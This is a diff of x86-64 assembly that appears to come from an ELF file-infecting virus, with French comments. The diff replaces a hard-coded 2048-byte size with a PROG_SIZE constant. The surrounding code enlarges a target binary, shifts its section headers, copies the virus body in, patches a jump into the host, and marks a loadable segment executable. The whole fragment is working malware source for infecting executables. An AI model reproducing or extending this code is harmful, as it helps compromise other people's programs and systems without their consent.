@@ -123,7 +123,7 @@ last_pload_found:                                                               
 increase_file_size:
     mov rdi, [r12 + fd]
     mov rsi, [r12 + fileData]
-    mov rdx, 2048
+    mov rdx, PROG_SIZE
     mov rax, SYS_WRITE
     syscall                     ;write(fd, filedata, PROG_SIZE);
     
@@ -140,7 +140,7 @@ relocate_section_header:
     
     
     
-    add rdi, 2048
+    add rdi, PROG_SIZE
     mov rcx, [r12 + fileSize]
     sub rcx, rdx
     mov rdx, rcx
@@ -152,9 +152,9 @@ relocate_section_header:
     rep stosb           ; while (i--) s[i] = c
 
 change_header:
-    add qword [r12 + fileSize], 2048
+    add qword [r12 + fileSize], PROG_SIZE
     mov rax, [r12 + fileData]
-    add qword [rax + e_shoff], 2048
+    add qword [rax + e_shoff], PROG_SIZE
 
 change_section_header:
     xor rbx, rbx
@@ -169,8 +169,8 @@ change_section_header:
     section_header_loop:
     cmp [rax + sh_offset], rsi
     jl no_section_change
-    add qword [rax + sh_offset], 2048
-    add qword [rax + sh_addr], 2048
+    add qword [rax + sh_offset], PROG_SIZE
+    add qword [rax + sh_addr], PROG_SIZE
     no_section_change:
     inc rdx
     add rax, rcx
@@ -204,8 +204,8 @@ copy_program:
     mov [rbx + JMP_OFFSET], byte 0xE9 ; 0xe9 = jmp
     mov [rbx + JMP_OFFSET + 1], ecx
     ; augmente la taille du premier pload
-    add qword [r13 + p_memsz], 2048
-    add qword [r13 + p_filesz], 2048
+    add qword [r13 + p_memsz], PROG_SIZE
+    add qword [r13 + p_filesz], PROG_SIZE
 
     or dword [r13 + p_flags], PF_X           ; ajoute les droit d'execution
     
